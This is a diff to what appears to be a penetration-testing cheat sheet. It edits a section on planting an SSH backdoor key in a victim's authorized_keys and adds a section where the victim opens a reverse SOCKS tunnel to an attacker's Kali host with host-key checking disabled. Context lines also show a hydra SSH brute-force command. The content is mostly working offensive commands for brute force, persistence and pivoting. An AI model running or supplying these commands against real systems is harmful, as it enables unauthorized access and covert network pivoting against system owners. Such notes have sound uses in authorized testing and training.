@@ -227,7 +227,7 @@ ftp> PASS anonymous
 hydra -V -f -L users.txt -P passwords.txt ssh://target.com -u -vV
 ~~~
 
-## SSH backdoor - post exploitation
+## SSH backdoor
 
 ~~~ bash
 # Attacker
@@ -236,11 +236,27 @@ chmod 600 <FILENAME>
 cat <FILENAME>.pub -> copy
 
 # Victim
-echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+cat <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
 
 # Connect
 ssh -i <FILENAME> <USER>@<IP>
 ~~~
+
+## SSH Port Forwarding
+
+~~~ bash
+# Victim
+ssh-keygen -t rsa -N '' -f ~/.ssh/key
+chmod 600 key
+cat key.pub -> copy
+
+# Attacker
+cat key.pub >> ~/.ssh/authorized_keys
+
+# Victim
+ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -I key kali@<KALI_IP>
+~~~
+
 
 ## Secure Copy Protocol(SCP)
 
